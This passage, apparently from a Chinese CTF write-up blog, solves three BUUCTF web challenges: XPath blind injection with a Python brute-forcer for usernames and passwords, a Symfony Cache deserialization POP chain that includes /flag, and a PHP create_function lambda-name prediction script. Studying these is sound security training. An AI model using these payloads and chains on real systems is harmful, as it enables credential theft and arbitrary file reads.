<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)=&#x27;</span><span class="string">u&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)=&#x27;</span>e<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>最终所有子节点值验证如下：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1)=&#x27;</span>usernam<span class="string">e&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="string">&#x27;  or &#x27;&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[3]), 1)=&#x27;</span>accounttyp<span class="string">e&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="string">&#x27;or substring(name(/accounts/user[position()=1]/*[4]), 1)=&#x27;</span><span class="keyword">password</span><span class="string">&#x27;  or &#x27;&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>继续猜解：</strong></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or count(/accounts/user[position()=1]/username/*)&gt;0 or &#x27;&#x27;=&#x27;   </span><br><span class="line">&#x27;or count(/accounts/user[position()=1]/email/*)&gt;0 or &#x27;&#x27;=&#x27; </span><br><span class="line">&#x27;or count(/accounts/user[position()=1]/accounttype/*)&gt;0 or &#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or count(/accounts/user[position()=1]/username/password/*)&gt;0 or &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>均为 false，不再有子节点，则可以尝试读取这些节点的值</strong></p>
<p><strong>第一个user下的username值长度为6:</strong></p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="keyword">or</span> <span class="built_in">string</span>-<span class="built_in">length</span>((//user[<span class="built_in">position</span>()=<span class="number">1</span>]/username[<span class="built_in">position</span>()=<span class="number">1</span>]))=<span class="number">6</span>  <span class="keyword">or</span> &#x27;&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>读取第一个user下usernaem的值</strong></p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>T<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="params">...</span>.</span><br><span class="line"><span class="string">&#x27;or substring((//user[position()=1]/username[position()=1]),6,1)=&#x27;</span>e<span class="string">&#x27;  or &#x27;</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>可依次读取所有的子节点的值，第二user节点的子节点值读取方式：</strong></p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or string-length((//user[position()=2]/username[position()=1]))=4 or &#x27;</span><span class="string">&#x27;=&#x27;</span>  第一个user下的username长度为<span class="number">4</span></span><br><span class="line"><span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>
<p><strong>重复上边步骤即可</strong></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://821c8f01-96e1-4a71-9954-1f22c9e87c88.node3.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">head =&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/xml&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">find =re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        r = s.post(url=url)</span><br><span class="line">        token = find.findall(r.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#猜测根节点名称</span></span><br><span class="line">        payload_1 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#猜测子节点名称</span></span><br><span class="line">        payload_2 = <span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测accounts的节点</span></span><br><span class="line">        payload_3 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#猜测user节点</span></span><br><span class="line">        payload_4 =<span class="string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#跑用户名和密码</span></span><br><span class="line">        payload_username =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        payload_password =<span class="string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="built_in">format</span>(i,j,token[<span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#整合payload</span></span><br><span class="line">        payload = payload_password</span><br><span class="line"></span><br><span class="line">        print(payload)</span><br><span class="line">        r = s.post(url=url,headers=head,data=payload)</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;非法操作&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;用户名&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>


<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>知识点：反序列化链构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="variable">$request</span>-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码很简单，下载source.tar.gz  很明显是让找POP链，最后能读取文件即可</p>
<p>既然直接给了一个unserialize，其他的什么都没有，所以首先考虑魔法函数<code>__destruct</code></p>
<p>那么我们在全局搜索一下<code>__destruct</code>，找到的可利用类是TagAwareAdapter类</p>
<p>这个类里面有一个<code>__destruct</code>方法，调用了commit方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>之后commit方法又调用了invalidateTags这个方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们跟进invalidateTags这个方法看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$tags</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ok</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$tagsByKey</span> = [];</span><br><span class="line">        <span class="variable">$invalidatedTags</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$tags</span> <span class="keyword">as</span> <span class="variable">$tag</span>) &#123;</span><br><span class="line">            CacheItem::validateKey(<span class="variable">$tag</span>);</span><br><span class="line">            <span class="variable">$invalidatedTags</span>[<span class="variable">$tag</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            <span class="variable">$items</span> = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">            <span class="variable">$tagsByKey</span> = <span class="variable">$f</span>(<span class="variable">$items</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tagVersions</span> = <span class="keyword">$this</span>-&gt;getTagVersions(<span class="variable">$tagsByKey</span>, <span class="variable">$invalidatedTags</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$tagsByKey</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$tags</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$f</span>(<span class="built_in">static</span>::TAGS_PREFIX.<span class="variable">$key</span>, array_intersect_key(<span class="variable">$tagVersions</span>, <span class="variable">$tags</span>), <span class="variable">$items</span>[<span class="variable">$key</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ok</span> = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; <span class="variable">$ok</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$invalidatedTags</span>) &#123;</span><br><span class="line">            <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">            <span class="variable">$ok</span> = <span class="variable">$f</span>(<span class="keyword">$this</span>-&gt;tags, <span class="variable">$invalidatedTags</span>) &amp;&amp; <span class="variable">$ok</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ok</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>要注意的是，我们可以控制整个TagAwareAdapter类中的成员变量，所以我们可以控制所有的$this-&gt;xxx这样子的变量。</p>
<p>在这一段代码中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">                    <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现，我们可以调用任意一个实现了saveDeferred方法的类，所以我们可以找一个可利用类为：PhpArrayAdapter类</p>
<p>我们看一下这个类中的saveDeffer方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span>(<span class="params">CacheItemInterface <span class="variable">$item</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[<span class="variable">$item</span>-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>进入到initialize这个方法，发现在本类中并没有定义，而是在一个trait这个关键词修饰的类中<code>trait PhpArrayTrait</code></p>
<p><strong>看一下trait这个关键词的用法</strong></p>
<blockquote>
<p><strong>trait</strong></p>
</blockquote>
<p><strong>这个关键词是php为了解决单继承的问题而特意建立的，在java这种面向对象的语言中，继承都是单继承的，一个类只能继承一个父类，这样确实体现了面向对象的思想，但是单继承在有的时候不是很方便</strong></p>
<p><strong>我们通过phpstorm的继承图生成可以清楚的看到PhpArrayAdapter这个类的继承关系</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu48.jpg"></p>
<p>那么在本类中没有定义initialize这个方法的话，自然就会去父类中寻找，我们来看看父类的initialize方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$values</span> = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">2</span> !== \count(<span class="variable">$values</span>) || !<span class="keyword">isset</span>(<span class="variable">$values</span>[<span class="number">0</span>], <span class="variable">$values</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = <span class="variable">$values</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以在PhpArrayAdapter中定义好<code>$this-&gt;file</code>这个变量，那么在调用initialize方法的时候，只要这个file是一个存在的文件，就会调用include来包含进去，最后就可以读取到flag了</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$file</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$deferred</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$pool</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">&#x27;xxx&#x27;</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#这两个类都是在Symfony\Component\Cache\Adapter命名空间下的</span></span><br><span class="line"><span class="comment">#而Cacheitem类则不在同一个类下。所以我们得新建一个命名空间。并且use导入</span></span><br></pre></td></tr></table></figure>


<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p><strong>知识点：匿名创建函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>首先创建了一个<code>$MY</code>的匿名函数。会输出flag<br>然后创建<code>$hash</code>会在eval函数中。与SUCTF拼接。形成一个新的函数名<br>要想拿到flag就只有调用SUCTF_XXXX随机数的函数名。或者直接调用<code>$MY</code></p>
<blockquote>
<p><strong>create_function()函数漏洞，create之后会自动生成一个函数名为%00lambda_%d</strong></p>
<p><strong><code>%d </code>这个值是一直递增的，这里的 <code>%d </code>会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使 <code>Pre-fork </code>模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。</strong></p>
</blockquote>
<p>paylaod</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://aecc2d1e-5c1a-4132-9754-71ada6af6b59.node3.buuoj.cn/?func_name=%00lambda_1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;Testing.......&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


